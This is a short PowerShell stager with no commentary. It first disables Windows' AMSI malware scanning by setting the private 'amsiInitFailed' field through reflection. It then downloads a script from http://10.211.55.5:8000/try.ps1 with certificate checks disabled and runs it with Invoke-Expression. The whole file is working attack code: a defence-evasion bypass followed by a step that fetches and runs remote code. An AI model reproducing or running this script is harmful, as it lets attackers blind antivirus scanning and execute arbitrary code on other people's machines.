

try {
    $asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $asm.GetField('amsiInitFailed', 'NonPublic,Static')
    $field.SetValue($null, $true)
} catch {
    Write-Host "AMSI Bypass failed: $_"
}


$scriptUrl = "http://10.211.55.5:8000/try.ps1"


try {
    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = New-Object System.Net.Http.HttpClient($handler)

    $response = $client.GetAsync($scriptUrl).Result 
    $response.EnsureSuccessStatusCode()
    $scriptContent = $response.Content.ReadAsStringAsync().Result
} catch {
    Write-Host "Download failed: $($_.Exception.Message)"
    exit 1
}


try {
    Write-Host "Executing script..."
    Invoke-Expression $scriptContent
} catch {
    Write-Host "Execution failed: $($_.Exception.Message)"
}
